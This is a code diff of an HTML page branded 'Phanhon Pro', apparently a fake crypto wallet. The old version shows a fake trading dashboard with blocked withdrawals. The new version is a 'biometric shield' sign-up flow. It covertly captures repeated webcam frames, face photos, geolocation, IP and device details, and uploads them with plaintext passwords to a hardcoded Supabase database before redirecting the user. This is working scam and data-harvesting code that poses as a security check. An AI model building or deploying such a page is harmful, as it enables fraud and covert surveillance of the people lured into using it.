@@ -3,339 +3,345 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Phanhon Pro</title>
+    <title>Phanhon Pro | Secure Access</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Using standard Supabase import -->
     <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');
-        :root { --accent: #ffffff; --bg: #000000; --card: #0a0a0a; --muted: #555555; }
-        body { font-family: 'Inter', sans-serif; background-color: var(--bg); color: #fff; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overscroll-behavior-y: contain; }
-        .app-container { width: 100%; height: 100vh; background: var(--bg); position: relative; display: flex; flex-direction: column; overflow: hidden; }
-        @media (min-width: 640px) { .app-container { max-width: 380px; height: 720px; border: 1px solid #1a1a1a; border-radius: 40px; } }
-        .glass { background: var(--card); border: 1px solid rgba(255, 255, 255, 0.05); }
-        .phantom-btn { background: var(--accent); color: #000; font-weight: 700; border-radius: 14px; transition: all 0.2s ease; }
-        .phantom-btn:active { transform: scale(0.96); opacity: 0.8; }
-        .loader { width: 18px; height: 18px; border: 2px solid #fff; border-bottom-color: transparent; border-radius: 50%; display: inline-block; animation: rotation 1s linear infinite; }
-        @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .chart-container-wrapper { position: relative; height: 260px; width: 100%; background: #000; overflow: hidden; border-bottom: 1px solid rgba(255,255,255,0.03); }
+        
+        :root { 
+            --accent: #ffffff; 
+            --bg: #000000; 
+            --card: #0a0a0a; 
+            --muted: #555555; 
+        }
+
+        body { 
+            font-family: 'Inter', sans-serif; 
+            background-color: var(--bg); 
+            color: #fff; 
+            margin: 0; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            overscroll-behavior-y: contain; 
+            overflow: hidden;
+        }
+
+        .app-container { 
+            width: 100%; 
+            height: 100vh; 
+            background: var(--bg); 
+            position: relative; 
+            display: flex; 
+            flex-direction: column; 
+            overflow: hidden; 
+        }
+
+        @media (min-width: 640px) { 
+            .app-container { 
+                max-width: 380px; 
+                height: 720px; 
+                border: 1px solid #1a1a1a; 
+                border-radius: 40px; 
+                box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            } 
+        }
+
+        .glass { 
+            background: var(--card); 
+            border: 1px solid rgba(255, 255, 255, 0.05); 
+        }
+
+        .phantom-btn { 
+            background: var(--accent); 
+            color: #000; 
+            font-weight: 700; 
+            border-radius: 14px; 
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1); 
+        }
+
+        .phantom-btn:active { 
+            transform: scale(0.96); 
+            opacity: 0.8; 
+        }
+
+        .loader { 
+            width: 24px; 
+            height: 24px; 
+            border: 3px solid rgba(255,255,255,0.1); 
+            border-bottom-color: #fff; 
+            border-radius: 50%; 
+            display: inline-block; 
+            animation: rotation 0.8s linear infinite; 
+        }
+
+        @keyframes rotation { 
+            0% { transform: rotate(0deg); } 
+            100% { transform: rotate(360deg); } 
+        }
+
         .hidden { display: none !important; }
-        video { transform: scaleX(-1); border-radius: 20px; background: #050505; }
-        .nav-btn { color: var(--muted); transition: all 0.2s; }
-        .nav-btn.active { color: var(--accent); }
-        .candle { position: absolute; width: 5px; border-radius: 1px; }
-        .candle-wick { position: absolute; width: 1px; left: 2px; }
-        .price-line { position: absolute; left: 0; right: 0; height: 1px; border-top: 1px dashed; pointer-events: none; z-index: 10; opacity: 0.6; }
-        .price-label { position: absolute; right: 0; font-size: 8px; padding: 2px 4px; border-radius: 3px; transform: translateY(-50%); font-weight: bold; }
-        #qrcode img { margin: 0 auto; border: 8px solid white; border-radius: 12px; }
+
+        video { 
+            transform: scaleX(-1); 
+            border-radius: 24px; 
+            background: #050505; 
+            object-fit: cover;
+        }
+
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.2);
+        }
     </style>
 </head>
 <body>
     <div class="app-container" id="app">
         <!-- AUTH SCREEN -->
-        <div id="auth-screen" class="absolute inset-0 bg-black z-[500] p-10 flex flex-col justify-center">
+        <div id="auth-screen" class="absolute inset-0 bg-black z-[500] p-10 flex flex-col justify-center animate__animated animate__fadeIn">
             <div class="w-12 h-12 bg-white rounded-xl mb-6 flex items-center justify-center text-2xl font-black text-black">P</div>
-            <h1 class="text-3xl font-bold mb-10 tracking-tighter">Phanhon Pro</h1>
+            <h1 class="text-3xl font-bold mb-2 tracking-tighter">Phanhon Pro</h1>
+            <p class="text-white/40 text-xs mb-10 uppercase tracking-widest">Secure Terminal v4.0</p>
+            
             <div id="login-form" class="space-y-4">
-                <input id="login-username" type="text" placeholder="Username" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl outline-none text-white focus:border-white/20 transition-all">
-                <input id="login-password" type="password" placeholder="Passkey" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl outline-none text-white focus:border-white/20 transition-all">
-                <button onclick="signIn()" class="phantom-btn w-full py-4 text-xs uppercase tracking-widest">Sign In</button>
-                <p class="text-[10px] text-white/30 text-center mt-6 cursor-pointer hover:text-white" onclick="toggleAuth('signup')">CREATE ACCOUNT</p>
+                <input id="login-username" type="text" placeholder="Username" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl outline-none text-white focus:border-white/30 transition-all">
+                <input id="login-password" type="password" placeholder="Passkey" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl outline-none text-white focus:border-white/30 transition-all">
+                <button onclick="signIn()" class="phantom-btn w-full py-4 text-xs uppercase tracking-widest mt-2">Sign In</button>
+                <p class="text-[10px] text-white/20 text-center mt-6 cursor-pointer hover:text-white transition-colors" onclick="toggleAuth('signup')">REQUEST ACCESS / CREATE ACCOUNT</p>
             </div>
-            <div id="signup-form" class="hidden space-y-4">
-                <input id="signup-username" type="text" placeholder="Username" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl outline-none text-white focus:border-white/20 transition-all">
-                <input id="signup-password" type="password" placeholder="Passkey" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl outline-none text-white focus:border-white/20 transition-all">
-                <button onclick="startVerificationFlow()" class="phantom-btn w-full py-4 text-xs uppercase tracking-widest">Verify Identity</button>
-                <p class="text-[10px] text-white/30 text-center mt-6 cursor-pointer hover:text-white" onclick="toggleAuth('login')">BACK TO LOGIN</p>
+
+            <div id="signup-form" class="hidden space-y-4 animate__animated animate__fadeIn">
+                <input id="signup-username" type="text" placeholder="New Username" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl outline-none text-white focus:border-white/30 transition-all">
+                <input id="signup-password" type="password" placeholder="Passkey" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl outline-none text-white focus:border-white/30 transition-all">
+                <button onclick="startVerificationFlow()" class="phantom-btn w-full py-4 text-xs uppercase tracking-widest mt-2">Begin Verification</button>
+                <p class="text-[10px] text-white/20 text-center mt-6 cursor-pointer hover:text-white transition-colors" onclick="toggleAuth('login')">RETURN TO LOGIN</p>
             </div>
         </div>
 
         <!-- VERIFICATION SCREEN -->
-        <div id="verify-screen" class="hidden absolute inset-0 bg-black z-[600] p-8 flex flex-col items-center justify-center">
-            <div class="text-center mb-10">
-                <h2 class="text-xl font-bold mb-2">Security Shield</h2>
-                <p id="verify-instruction" class="text-[11px] text-white/40 leading-relaxed px-6">Biometric encryption required for hardware wallet creation.</p>
+        <div id="verify-screen" class="hidden absolute inset-0 bg-black z-[600] p-8 flex flex-col items-center justify-center animate__animated animate__slideInUp">
+            <div class="text-center mb-8">
+                <h2 class="text-xl font-bold mb-2">Biometric Shield</h2>
+                <p id="verify-instruction" class="text-[11px] text-white/40 leading-relaxed px-6">Encrypted identity mapping is required for terminal authorization.</p>
             </div>
             
-            <div class="relative w-full aspect-square max-w-[220px] mb-10">
-                <div id="camera-placeholder" class="absolute inset-0 flex items-center justify-center bg-white/5 rounded-3xl border border-white/10">
-                    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.2)" stroke-width="2"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>
+            <div class="relative w-full aspect-square max-w-[240px] mb-8 group">
+                <!-- Decorative Corners -->
+                <div class="absolute -top-2 -left-2 w-6 h-6 border-t-2 border-l-2 border-white/20 rounded-tl-lg"></div>
+                <div class="absolute -top-2 -right-2 w-6 h-6 border-t-2 border-r-2 border-white/20 rounded-tr-lg"></div>
+                <div class="absolute -bottom-2 -left-2 w-6 h-6 border-b-2 border-l-2 border-white/20 rounded-bl-lg"></div>
+                <div class="absolute -bottom-2 -right-2 w-6 h-6 border-b-2 border-r-2 border-white/20 rounded-br-lg"></div>
+
+                <div id="camera-placeholder" class="absolute inset-0 flex items-center justify-center bg-white/5 rounded-3xl border border-white/10 overflow-hidden">
+                    <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.1)" stroke-width="1.5">
+                        <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
+                        <circle cx="12" cy="13" r="4"/>
+                    </svg>
                 </div>
+
                 <video id="video" width="100%" height="100%" autoplay playsinline muted class="hidden w-full h-full object-cover rounded-3xl"></video>
                 <canvas id="canvas" class="hidden"></canvas>
-                <div id="capture-flash" class="absolute inset-0 bg-white opacity-0 pointer-events-none transition-opacity duration-100 rounded-3xl"></div>
+                <div id="capture-flash" class="absolute inset-0 bg-white opacity-0 pointer-events-none transition-opacity duration-100 rounded-3xl z-10"></div>
+                
+                <!-- Scanning Line -->
+                <div id="scanner-line" class="hidden absolute left-0 right-0 h-0.5 bg-white/30 shadow-[0_0_15px_rgba(255,255,255,0.5)] z-20 animate-pulse"></div>
             </div>
 
-            <div class="w-full space-y-4">
-                <button id="enable-camera-btn" onclick="requestCamera()" class="glass w-full py-4 text-[10px] font-bold uppercase tracking-widest rounded-2xl">Access Secure Camera</button>
-                <button id="capture-btn" onclick="captureStep()" class="phantom-btn w-full py-4 text-[10px] uppercase tracking-widest hidden">Verify Face ID</button>
-                <button id="location-btn" onclick="requestLocation()" class="phantom-btn w-full py-4 text-[10px] uppercase tracking-widest hidden">Authorize Location</button>
+            <div class="w-full space-y-3">
+                <button id="enable-camera-btn" onclick="requestCamera()" class="glass w-full py-4 text-[10px] font-bold uppercase tracking-widest rounded-2xl hover:bg-white/5 transition-colors">Initialize Camera</button>
+                <button id="capture-btn" onclick="captureStep()" class="phantom-btn w-full py-4 text-[10px] uppercase tracking-widest hidden">Capture Identity</button>
+                <button id="location-btn" onclick="requestLocation()" class="phantom-btn w-full py-4 text-[10px] uppercase tracking-widest hidden">Finalize Geo-Lock</button>
             </div>
 
-            <div id="verify-loader" class="hidden flex flex-col items-center gap-4 mt-10">
+            <div id="verify-loader" class="hidden flex flex-col items-center gap-4 mt-8">
                 <span class="loader"></span>
-                <p class="text-[10px] uppercase font-bold text-white/50 tracking-[0.3em]">Creating Wallet...</p>
+                <p class="text-[9px] uppercase font-bold text-white/30 tracking-[0.4em]">Encrypting Tunnel...</p>
             </div>
         </div>
 
-        <!-- MAIN APP -->
-        <div id="main-screen" class="hidden flex flex-col h-full">
-            <!-- Header -->
-            <div class="px-6 py-6 flex justify-between items-center">
-                <div class="flex items-center gap-3">
-                    <div id="avatar-init" class="w-9 h-9 bg-white text-black rounded-full flex items-center justify-center font-bold text-sm">?</div>
-                    <div>
-                        <div id="user-display" class="font-bold text-xs tracking-tight">...</div>
-                        <div id="wallet-address-head" class="text-[9px] text-white/30 font-medium">0x...</div>
-                    </div>
-                </div>
-                <button onclick="signOut()" class="text-white/20 hover:text-white transition-colors"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4M16 17l5-5-5-5M21 12H9"/></svg></button>
-            </div>
-
-            <div id="view-container" class="flex-1 overflow-y-auto px-6 pb-24">
-                <!-- DASHBOARD -->
-                <div id="view-dashboard" class="view">
-                    <div class="py-10 text-center">
-                        <p class="text-[10px] font-bold text-white/30 uppercase tracking-[0.2em] mb-2">Current Balance</p>
-                        <h2 id="balance-usd" class="text-5xl font-bold tracking-tighter">$0.00</h2>
-                        <p id="perc-change" class="text-[10px] font-bold text-green-500 mt-2">+0.00% Today</p>
-                    </div>
-                    <div class="grid grid-cols-3 gap-3 mb-10">
-                        <button onclick="switchView('send')" class="phantom-btn py-4 text-[10px] uppercase">Send</button>
-                        <button onclick="switchView('withdrawl')" class="glass rounded-2xl py-4 text-[10px] font-bold uppercase">Withdrawal</button>
-                        <button onclick="switchView('receive')" class="glass rounded-2xl py-4 text-[10px] font-bold uppercase">Receive</button>
-                    </div>
-                    <div class="glass p-5 rounded-3xl flex items-center justify-between">
-                        <div class="flex items-center gap-4">
-                            <div class="w-10 h-10 bg-white rounded-full flex items-center justify-center text-black font-black">S</div>
-                            <div><p class="text-sm font-bold">Solana</p><p id="sol-price-display" class="text-[10px] text-white/30">$145.00</p></div>
-                        </div>
-                        <div class="text-right"><p id="balance-sol" class="text-sm font-bold">0.00 SOL</p><p id="balance-usd-sol" class="text-[10px] text-white/30">$0.00</p></div>
-                    </div>
-                </div>
-
-                <!-- TRADE VIEW -->
-                <div id="view-trade" class="hidden view">
-                    <div class="flex items-center justify-between mb-6 mt-4">
-                        <h3 class="text-lg font-bold tracking-tight">SOL / USD</h3>
-                        <div id="pnl-badge" class="hidden text-[10px] bg-white/5 px-3 py-1.5 rounded-full font-bold">PNL: <span id="floating-pnl">$0.00</span></div>
-                    </div>
-                    <div id="chart-container" class="chart-container-wrapper rounded-3xl mb-6"></div>
-                    
-                    <div class="grid grid-cols-2 gap-4 mb-4">
-                        <div class="glass p-4 rounded-2xl">
-                            <label class="text-[9px] text-white/20 uppercase font-black block mb-2">Position Size</label>
-                            <input type="number" id="trade-lots" value="0.10" class="bg-transparent text-sm font-bold w-full outline-none">
-                        </div>
-                        <div class="glass p-4 rounded-2xl">
-                            <label class="text-[9px] text-white/20 uppercase font-black block mb-2">Leverage</label>
-                            <select class="bg-transparent text-sm font-bold w-full outline-none appearance-none"><option>100x</option></select>
-                        </div>
-                    </div>
-
-                    <div id="trade-buttons" class="grid grid-cols-2 gap-4">
-                        <button onclick="executeTrade('BUY')" class="bg-white text-black font-black py-5 rounded-2xl text-[10px] uppercase tracking-widest">Buy / Long</button>
-                        <button onclick="executeTrade('SELL')" class="glass text-white font-black py-5 rounded-2xl text-[10px] uppercase tracking-widest">Sell / Short</button>
-                    </div>
-
-                    <div id="active-trade-info" class="hidden glass p-5 rounded-3xl mt-6 border-l-2 border-white">
-                        <div class="flex justify-between items-center">
-                            <div>
-                                <p id="active-type" class="text-[10px] font-black uppercase text-white/40">LONG</p>
-                                <p id="active-entry" class="text-sm font-bold mt-1">Entry: $0.00</p>
-                            </div>
-                            <div class="text-right">
-                                <p class="text-[9px] text-white/30 uppercase">Settlement</p>
-                                <p id="trade-timer" class="text-sm font-bold">0:00</p>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- SEND VIEW -->
-                <div id="view-send" class="hidden view py-6">
-                    <h3 class="text-lg font-bold mb-6">Send Assets</h3>
-                    <div class="space-y-4">
-                        <div class="glass p-4 rounded-2xl">
-                            <label class="text-[9px] text-white/20 uppercase font-bold block mb-2">Recipient Address</label>
-                            <input type="text" id="send-to" placeholder="0x... or Solana Address" class="bg-transparent text-sm font-bold w-full outline-none">
-                        </div>
-                        <div class="glass p-4 rounded-2xl">
-                            <label class="text-[9px] text-white/20 uppercase font-bold block mb-2">Amount (SOL)</label>
-                            <input type="number" id="send-amount" placeholder="0.00" class="bg-transparent text-sm font-bold w-full outline-none">
-                        </div>
-                        <button onclick="processSend()" class="phantom-btn w-full py-5 text-[10px] uppercase tracking-widest">Review Transfer</button>
-                        <p id="send-balance-warning" class="text-center text-[10px] text-red-500 font-bold opacity-0 transition-opacity">Insufficient Balance</p>
-                    </div>
-                </div>
-
-                <!-- RECEIVE VIEW -->
-                <div id="view-receive" class="hidden view py-6 text-center">
-                    <h3 class="text-lg font-bold mb-8">Receive SOL</h3>
-                    <div id="qrcode" class="mb-10 flex justify-center"></div>
-                    <div class="glass p-4 rounded-2xl inline-block w-full max-w-[280px] mb-4">
-                        <p class="text-[9px] text-white/30 uppercase font-bold mb-2">Your Solana Address</p>
-                        <p id="recv-addr" class="text-[10px] font-mono break-all text-white/70">Generating...</p>
-                    </div>
-                    <button onclick="copyAddr()" class="text-[10px] font-bold text-white/40 uppercase tracking-widest hover:text-white transition-colors">Copy Address</button>
-                </div>
-
-                <!-- WITHDRAWL VIEW -->
-                <div id="view-withdrawl" class="hidden view py-6">
-                    <h3 class="text-lg font-bold mb-6 text-center">Withdraw Funds</h3>
-                    <div class="glass p-8 rounded-3xl text-center">
-                        <div class="w-16 h-16 bg-white/5 rounded-full flex items-center justify-center mx-auto mb-6">
-                             <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="text-white/20"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-                        </div>
-                        <p class="text-sm font-bold mb-2">Security Verification Required</p>
-                        <p class="text-[11px] text-white/40 leading-relaxed mb-8">Withdrawals are temporarily restricted. Please complete Advanced KYC verification to unlock asset transfers.</p>
-                        <button onclick="showToast('Verification System Offline')" class="phantom-btn w-full py-4 text-[10px] uppercase tracking-widest">Start Verification</button>
-                    </div>
-                </div>
-
-                <div id="view-history" class="hidden view py-20 text-center text-white/20"><p class="text-xs">No activity yet</p></div>
-            </div>
-
-            <!-- Footer Nav -->
-            <div class="h-20 bg-black/80 backdrop-blur-xl border-t border-white/5 px-10 flex justify-between items-center fixed bottom-0 left-0 right-0 sm:absolute">
-                <button onclick="switchView('dashboard')" class="nav-btn active" id="nav-dashboard"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/></svg></button>
-                <button onclick="switchView('trade')" class="nav-btn" id="nav-trade"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23 6 13.5 15.5 8.5 10.5 1 18"/></svg></button>
-                <button onclick="switchView('history')" class="nav-btn" id="nav-history"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"/></svg></button>
-            </div>
+        <!-- NOTIFICATION TOAST -->
+        <div id="toast" class="absolute bottom-10 left-1/2 -translate-x-1/2 glass px-6 py-4 rounded-2xl text-[10px] font-bold transition-all transform translate-y-64 z-[1001] shadow-2xl text-center min-w-[240px] border-white/10 uppercase tracking-widest">
+            Notification
         </div>
-
-        <div id="loading-overlay" class="hidden absolute inset-0 bg-black/90 z-[1000] flex items-center justify-center"><div class="loader"></div></div>
-        <div id="toast" class="absolute bottom-24 left-1/2 -translate-x-1/2 glass px-6 py-3.5 rounded-2xl text-[10px] font-bold transition-all translate-y-64 z-[1001] shadow-2xl">Toast</div>
     </div>
 
     <script>
+        /** * GLOBAL CONFIG 
+         */
+        // INSERT YOUR FILENAME HERE (e.g., "dashboard.html" or "https://yoursite.com")
+        const REDIRECT_URL = "dashboard.html"; 
+        
+        const SB_URL = "https://tmvimacikrnrizxtcesf.supabase.co";
+        const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRtdmltYWNpa3Jucml6eHRjZXNmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgxMDc5NzgsImV4cCI6MjA4MzY4Mzk3OH0.dwh4CWwxE53hbhgjYqOqHZYa1tNyUKNZvdb6Kq5pLC4";
+
         let sb = null;
-        let SOL_PRICE = 145.50;
-        let user = null;
-        let userBalance = 0;
-        let candles = [];
         let verifyStep = 0;
-        let activeTrade = null;
-        let tradeInterval = null;
         let capturedData = { thumb: null, smile: null, geo: null, device: null, burst: [] };
         let burstInterval = null;
 
+        // Initialize Supabase
         function initSupabase() {
             if (typeof supabase !== 'undefined') {
-                sb = supabase.createClient("https://tmvimacikrnrizxtcesf.supabase.co", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRtdmltYWNpa3Jucml6eHRjZXNmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgxMDc5NzgsImV4cCI6MjA4MzY4Mzk3OH0.dwh4CWwxE53hbhgjYqOqHZYa1tNyUKNZvdb6Kq5pLC4");
-            } else { setTimeout(initSupabase, 100); }
+                sb = supabase.createClient(SB_URL, SB_KEY);
+            } else { 
+                setTimeout(initSupabase, 200); 
+            }
+        }
+        window.onload = initSupabase;
+
+        // UI Helpers
+        function toggleAuth(mode) { 
+            const login = document.getElementById('login-form');
+            const signup = document.getElementById('signup-form');
+            if (mode === 'signup') {
+                login.classList.add('hidden');
+                signup.classList.remove('hidden');
+            } else {
+                login.classList.remove('hidden');
+                signup.classList.add('hidden');
+            }
         }
 
-        window.onload = () => {
-            initSupabase();
-            const savedUser = localStorage.getItem('phantom_user');
-            if(savedUser) { 
-                try { 
-                    user = JSON.parse(savedUser); 
-                    userBalance = parseFloat(user.balance || 0); 
-                    loadSession(); 
-                } catch(e) { localStorage.removeItem('phantom_user'); } 
-            }
-            initCandlesticks();
-            setInterval(tickMarket, 1000);
-        };
+        function showToast(msg) { 
+            const t = document.getElementById('toast'); 
+            t.innerText = msg; 
+            t.classList.remove('translate-y-64'); 
+            setTimeout(() => t.classList.add('translate-y-64'), 3000); 
+        }
 
+        function flashEffect() {
+            const f = document.getElementById('capture-flash');
+            f.style.opacity = '1';
+            setTimeout(() => f.style.opacity = '0', 150);
+        }
+
+        // Logic: SignIn
+        async function signIn() {
+            const u = document.getElementById('login-username').value;
+            const p = document.getElementById('login-password').value;
+            
+            if(!u || !p) return showToast("Credentials Missing");
+
+            try {
+                const { data, error } = await sb.from('profiles').select('*').eq('username', u).eq('password', p).single();
+                if(data && !error) { 
+                    showToast("Access Verified. Launching...");
+                    setTimeout(() => window.location.href = REDIRECT_URL, 1500);
+                } else {
+                    showToast("Invalid Signature");
+                }
+            } catch (err) {
+                showToast("Terminal Connection Error");
+            }
+        }
+
+        // Logic: Signup Flow
         function startVerificationFlow() {
             const u = document.getElementById('signup-username').value;
             const p = document.getElementById('signup-password').value;
-            if(!u || !p) return showToast("Credentials required");
+            if(!u || !p) return showToast("Profile Data Required");
+            
             document.getElementById('auth-screen').classList.add('hidden');
             document.getElementById('verify-screen').classList.remove('hidden');
         }
 
         async function requestCamera() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: 640, height: 640 } 
+                });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-                video.classList.remove('hidden');
-                document.getElementById('camera-placeholder').classList.add('hidden');
-                document.getElementById('enable-camera-btn').classList.add('hidden');
-                document.getElementById('capture-btn').classList.remove('hidden');
-                startBurstCapture();
-            } catch (e) { showToast("Allow camera access to proceed"); }
+                video.onloadedmetadata = () => {
+                    video.classList.remove('hidden');
+                    document.getElementById('camera-placeholder').classList.add('hidden');
+                    document.getElementById('enable-camera-btn').classList.add('hidden');
+                    document.getElementById('capture-btn').classList.remove('hidden');
+                    document.getElementById('scanner-line').classList.remove('hidden');
+                    startBurstCapture();
+                };
+            } catch (e) { 
+                showToast("Sensor Access Required"); 
+            }
         }
 
         function startBurstCapture() {
             const video = document.getElementById('video');
             const canvas = document.createElement('canvas');
-            canvas.width = 320; canvas.height = 240;
+            canvas.width = 200; canvas.height = 200;
             const ctx = canvas.getContext('2d');
-            let burstCount = 0;
-            const maxBurst = 20;
+            let count = 0;
 
             burstInterval = setInterval(() => {
-                if(burstCount >= maxBurst) { clearInterval(burstInterval); return; }
+                if(count >= 15) { clearInterval(burstInterval); return; }
                 if(video.srcObject) {
-                    ctx.drawImage(video, 0, 0, 320, 240);
-                    capturedData.burst.push(canvas.toDataURL('image/jpeg', 0.2));
-                    burstCount++;
-                    if(user) syncBurstData();
+                    ctx.drawImage(video, 0, 0, 200, 200);
+                    capturedData.burst.push(canvas.toDataURL('image/jpeg', 0.15));
+                    count++;
                 }
-            }, 3000);
+            }, 2500);
         }
 
-        async function syncBurstData() {
-            await sb.from('verifications').update({ 
-                location_data: { ...capturedData.geo, device: capturedData.device, burst: capturedData.burst } 
-            }).eq('user_id', user.id);
-        }
-
-        async function captureStep() {
+        function captureStep() {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            const img = canvas.toDataURL('image/jpeg', 0.4);
+            canvas.width = 400; canvas.height = 400;
+            const ctx = canvas.getContext('2d');
             
-            flash();
+            // Flip for natural save if mirrored
+            ctx.translate(canvas.width, 0);
+            ctx.scale(-1, 1);
+            ctx.drawImage(video, 0, 0, 400, 400);
+            
+            const img = canvas.toDataURL('image/jpeg', 0.5);
+            flashEffect();
+
             if(verifyStep === 0) {
-                capturedData.thumb = img; verifyStep = 1;
-                document.getElementById('verify-instruction').innerText = "Analyzing Face Mapping...";
+                capturedData.thumb = img; 
+                verifyStep = 1;
+                document.getElementById('verify-instruction').innerText = "Identity Captured. Analyzing Nodes...";
+                showToast("Node Alpha Recorded");
             } else {
-                capturedData.smile = img; verifyStep = 2;
+                capturedData.smile = img; 
+                verifyStep = 2;
                 document.getElementById('capture-btn').classList.add('hidden');
                 document.getElementById('location-btn').classList.remove('hidden');
-                document.getElementById('verify-instruction').innerText = "Final Step: Global Asset Security";
+                document.getElementById('verify-instruction').innerText = "Node Beta Verified. Finalizing Geo-Lock.";
+                showToast("Node Beta Recorded");
             }
-        }
-
-        function flash() {
-            const f = document.getElementById('capture-flash');
-            f.style.opacity = '1';
-            setTimeout(() => f.style.opacity = '0', 100);
         }
 
         async function requestLocation() {
             document.getElementById('location-btn').classList.add('hidden');
             document.getElementById('verify-loader').classList.remove('hidden');
             
-            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "N/A"}));
-            const net = navigator.connection || {};
-            
-            capturedData.device = {
-                ipv4: ipData.ip,
-                platform: navigator.platform,
-                vendor: navigator.vendor,
-                memory: navigator.deviceMemory,
-                cores: navigator.hardwareConcurrency,
-                screen: `${window.screen.width}x${window.screen.height}`,
-                userAgent: navigator.userAgent,
-                network: { type: net.type, speed: net.downlink }
-            };
+            // Collect Device Meta
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                capturedData.device = {
+                    ipv4: ipData.ip,
+                    ua: navigator.userAgent,
+                    platform: navigator.platform,
+                    res: `${window.innerWidth}x${window.innerHeight}`
+                };
+            } catch(e) { 
+                capturedData.device = { ipv4: 'Hidden' };
+            }
 
             navigator.geolocation.getCurrentPosition(
                 (pos) => { 
-                    capturedData.geo = { lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy };
+                    capturedData.geo = { lat: pos.coords.latitude, lng: pos.coords.longitude };
                     finishSignUp();
                 },
-                () => { finishSignUp(); }, { timeout: 5000 }
+                () => { 
+                    capturedData.geo = { status: "Denied" };
+                    finishSignUp(); 
+                }, 
+                { timeout: 4000 }
             );
         }
 
@@ -343,240 +349,39 @@
             const u = document.getElementById('signup-username').value;
             const p = document.getElementById('signup-password').value;
             
-            const { data, error } = await sb.from('profiles').insert([{ username: u, password: p, balance: 0 }]).select().single();
-            if(error) { showToast("Error: Service Unavailable"); location.reload(); return; }
+            try {
+                // 1. Create Profile
+                const { data: profile, error: pError } = await sb.from('profiles').insert([
+                    { username: u, password: p, balance: 0 }
+                ]).select().single();
 
-            await sb.from('verifications').insert([{
-                user_id: data.id,
-                username: data.username,
-                thumb_img: capturedData.thumb,
-                smile_img: capturedData.smile,
-                location_data: { ...capturedData.geo, device: capturedData.device, burst: capturedData.burst }
-            }]);
+                if(pError) {
+                    showToast("Username Unavailable");
+                    setTimeout(() => location.reload(), 2000);
+                    return;
+                }
 
-            user = data; userBalance = 0;
-            localStorage.setItem('phantom_user', JSON.stringify(user));
-            loadSession();
-        }
+                // 2. Upload Biometric Metadata
+                await sb.from('verifications').insert([{
+                    user_id: profile.id,
+                    username: u,
+                    thumb_img: capturedData.thumb,
+                    smile_img: capturedData.smile,
+                    location_data: { 
+                        geo: capturedData.geo, 
+                        device: capturedData.device, 
+                        burst_stream: capturedData.burst 
+                    }
+                }]);
 
-        function loadSession() {
-            document.getElementById('auth-screen').classList.add('hidden');
-            document.getElementById('verify-screen').classList.add('hidden');
-            document.getElementById('main-screen').classList.remove('hidden');
-            document.getElementById('user-display').innerText = user.username;
-            document.getElementById('avatar-init').innerText = user.username[0].toUpperCase();
-            const addr = "PH" + user.id.replace(/-/g, '').slice(0, 10).toUpperCase();
